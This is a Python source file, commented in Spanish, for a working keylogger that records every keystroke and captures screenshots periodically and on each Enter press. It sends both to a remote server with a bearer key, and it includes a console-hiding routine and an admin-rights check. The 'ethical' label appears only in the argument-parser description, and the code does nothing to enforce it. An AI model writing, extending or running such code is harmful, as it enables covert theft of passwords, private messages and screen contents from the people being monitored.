import keyboard
import os
import sys
import ctypes
from datetime import datetime
from PIL import Image, ImageGrab
import time
import requests
import argparse
import logging
import io
import json
import threading

# Configurar logging
logging.basicConfig(
    filename="debug.log",
    level=logging.DEBUG,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

class Keylogger:
    def __init__(self, server_url, api_key, log_file="keylog.txt"):
        self.is_logging = False
        self.server_url = server_url
        self.api_key = api_key
        self.log_file = log_file
        self.keys_buffer = []
        self.last_send_time = time.time()
        # Crear/sobrescribir el archivo de log al iniciar
        try:
            with open(self.log_file, "w", encoding="utf-8") as f:
                f.write("Keylogger Log - Started at {}\n".format(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            logging.info(f"Archivo de log creado/sobrescrito: {self.log_file}")
        except Exception as e:
            logging.error(f"Error al crear archivo de log: {e}")
        logging.info("Keylogger inicializado")

    def take_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            buffer.seek(0)
            filename = f"screenshot_{timestamp}.png"
            files = {
                "file": (filename, buffer, "image/png")
            }
            headers = {"Authorization": f"Bearer {self.api_key}"}
            response = requests.post(f"{self.server_url}/upload", files=files, headers=headers, timeout=10)
            logging.info(f"Captura enviada: {filename}, Respuesta: {response.text}")
            buffer.close()
        except Exception as e:
            logging.error(f"Error al enviar captura: {e}")

    def send_keys(self):
        if not self.keys_buffer:
            return
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            keys_data = {"keys": self.keys_buffer, "timestamp": timestamp}
            headers = {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
            response = requests.post(f"{self.server_url}/upload_keys", json=keys_data, headers=headers, timeout=10)
            logging.info(f"Teclas enviadas: {len(self.keys_buffer)}, Respuesta: {response.text}")
            self.save_keys()  # Guardar localmente después de enviar
        except Exception as e:
            logging.error(f"Error al enviar teclas: {e}")
            self.save_keys()  # Guardar localmente incluso si falla el envío

    def save_keys(self):
        if not self.keys_buffer:
            return
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                for entry in self.keys_buffer:
                    f.write(entry + "\n")
            logging.info(f"Teclas guardadas localmente: {len(self.keys_buffer)}")
            self.keys_buffer = []  # Limpiar buffer
        except Exception as e:
            logging.error(f"Error al guardar teclas localmente: {e}")

    def capture_keys(self):
        last_screenshot_time = time.time()
        while self.is_logging:
            try:
                event = keyboard.read_event(suppress=False)  # Sin supresión para capturar todas las teclas
                if event.event_type == keyboard.KEY_DOWN:
                    key_str = event.name
                    if key_str:
                        # Normalizar nombres de teclas
                        if len(key_str) > 1:
                            key_str = f"[{key_str.upper()}]"
                        else:
                            key_str = key_str.lower()  # Letras en minúsculas para legibilidad
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        log_entry = f"{timestamp} | Key: {key_str}"
                        self.keys_buffer.append(log_entry)
                        logging.debug(f"Tecla registrada: {key_str}")
                        # Enviar/guardar teclas cada 2 segundos
                        if time.time() - self.last_send_time >= 2:
                            self.send_keys()
                            self.last_send_time = time.time()
                        if key_str == "[ENTER]":
                            self.take_screenshot()
                if time.time() - last_screenshot_time >= 10:
                    self.take_screenshot()
                    last_screenshot_time = time.time()
            except Exception as e:
                logging.error(f"Error en captura de teclas: {e}")
                time.sleep(0.1)

    def start_logging(self):
        if not self.is_logging:
            try:
                self.is_logging = True
                threading.Thread(target=self.capture_keys, daemon=True).start()
                logging.info("Captura iniciada")
                self.take_screenshot()  # Captura inicial
            except Exception as e:
                logging.error(f"Error al iniciar captura: {e}")

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.send_keys()  # Enviar y guardar teclas restantes
            logging.info("Captura detenida")

def hide_console():
    try:
        if os.name == "nt":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        logging.info("Consola ocultada")
    except Exception as e:
        logging.error(f"Error al ocultar consola: {e}")

def check_admin():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            logging.error("Debe ejecutarse como administrador")
            print("[ERROR] Ejecuta este script como administrador")
            sys.exit(1)
        logging.info("Ejecutando como administrador")
    except Exception as e:
        logging.error(f"Error al verificar administrador: {e}")

def main(server_url, api_key, log_file):
    check_admin()
    # hide_console()  # Desactivado para depuración
    logging.info("Iniciando keylogger")
    keylogger = Keylogger(server_url, api_key, log_file)
    keylogger.start_logging()
    try:
        keyboard.wait("ctrl+alt+q")
        keylogger.stop_logging()
        logging.info("Script detenido con Ctrl+Alt+Q")
    except Exception as e:
        logging.error(f"Error en ejecución principal: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Keylogger ético")
    parser.add_argument("--server-url", required=True, help="URL del servidor")
    parser.add_argument("--api-key", required=True, help="Clave API")
    parser.add_argument("--log-file", default="keylog.txt", help="Archivo para guardar las teclas")
    args = parser.parse_args()
    main(args.server_url, args.api_key, args.log_file)